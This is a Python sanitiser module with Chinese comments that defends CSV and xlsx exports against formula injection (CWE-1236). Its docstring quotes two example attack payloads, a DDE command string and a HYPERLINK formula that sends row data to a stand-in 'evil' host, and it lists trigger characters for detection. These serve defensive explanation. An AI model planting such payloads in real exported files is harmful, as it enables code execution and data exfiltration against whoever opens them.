"""中和 CSV / 公式注入（CWE-1236）。

## 問題

我們匯出的 CSV 幾乎都會被拿去用 Excel 開。試算表看到 `=`、`+`、`-`、`@` 開頭的
儲存格會**當成公式執行**，而那些欄位的內容是使用者（甚至是外部人士）提供的：

* **註解匯出**最嚴重 —— 註解的作者與內容來自**別人給的 PDF**。攻擊者寄一份把
  作者填成 `=cmd|'/c calc'!A1` 的 PDF 過來，收件者只是想看看有哪些註解、匯出成
  CSV 用 Excel 打開，公式就在他的電腦上跑了。
* **稽核記錄匯出**的開檔者是管理員，而 `target` / `details` 欄位裡有檔名 ——
  檔名是使用者自己取的。

Excel 對 `=` 開頭會跳一次警告，但不能當成防護：那個警告長得像常見的「啟用內容」
提示，很多人習慣按下去；而 `=HYPERLINK("http://evil/?d="&A1,"點我")` **完全不會
跳警告**，點一下就把同一列的資料送出去；LibreOffice / Numbers / Google 試算表的
行為又各自不同。

## 做法

OWASP 的建議：危險開頭的值前面補一個單引號。單引號在試算表裡的意思是「以下是
文字」，**開檔看到的內容不變**，但不會被當成公式。

只看**開頭**字元，所以 `a=b`、`2026-07-30`、負數以外的一般內容都不受影響。
數字型欄位（頁碼、座標）原樣通過 —— 它們不是字串。

> 註：`-` 開頭的負數（`-5`）也會被加上引號，因此在試算表裡變成文字而不是數字。
> 這是刻意的取捨：目前所有匯出的數值欄位（頁碼、座標、筆數）都是**非字串**型別，
> 會原樣通過；只有字串欄位才會經過這裡，而字串欄位裡的 `-3` 本來就不該被當成
> 可運算的數字。
"""
from __future__ import annotations

from typing import Any

#: 試算表會把這些開頭的儲存格當成公式。
#: `\t` / `\r` 也列入 —— 有些版本會先去掉前置空白再判斷，等於繞過只看第一個字元
#: 的檢查。
_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

#: 前置的單引號：試算表看到它就知道整格是文字。
_PREFIX = "'"


def sanitize(value: Any) -> Any:
    """把一個儲存格的值變成「不會被當成公式」的形式。

    * 非字串（數字 / bool）原樣回傳 —— 它們不可能是公式。
    * `None` 回空字串（CSV 裡的 `None` 會被寫成字面的 "None"）。
    * 已經以單引號開頭的不再加（可重複套用）。
    """
    if value is None:
        return ""
    if not isinstance(value, str):
        return value
    if not value:
        return value
    if value.startswith(_PREFIX):
        return value
    if value[0] in _TRIGGERS:
        return _PREFIX + value
    # 前面墊空白再接 `=`：有些試算表匯入時會先去掉前置空白再判斷是不是公式
    head = value.lstrip(" \u3000\n\x0b\x0c")
    if head and head[0] in _TRIGGERS:
        return _PREFIX + value
    return value


def row(values) -> list:
    """整列套用。`writer.writerow(csv_safe.row([...]))`"""
    return [sanitize(v) for v in values]


def xlsx_cell(ws, row_no: int, column: int, value: Any):
    """寫一格 .xlsx，並確保字串不會被存成公式。回傳該 cell。

    **xlsx 比 CSV 更危險**：openpyxl 看到 `=` 開頭的字串會把整格存成
    `data_type='f'`（真正的公式），於是 Excel 打開時**連警告都不會跳** ——
    那是一個合法的公式儲存格，不是可疑的文字。實測：

        >>> ws.cell(row=1, column=1, value="=1+1").data_type
        'f'

    這裡不能用 CSV 那招（前面補單引號）—— 在 xlsx 裡那個引號會變成內容的一部分，
    使用者會看到多出來的符號。正確做法是把儲存格型別**強制設成文字**，內容原封
    不動。順序很重要：先指定 value（openpyxl 這時猜型別），再覆寫 `data_type`。
    """
    cell = ws.cell(row=row_no, column=column, value=value)
    if isinstance(value, str) and value and value[0] in _TRIGGERS:
        cell.data_type = "s"
    return cell
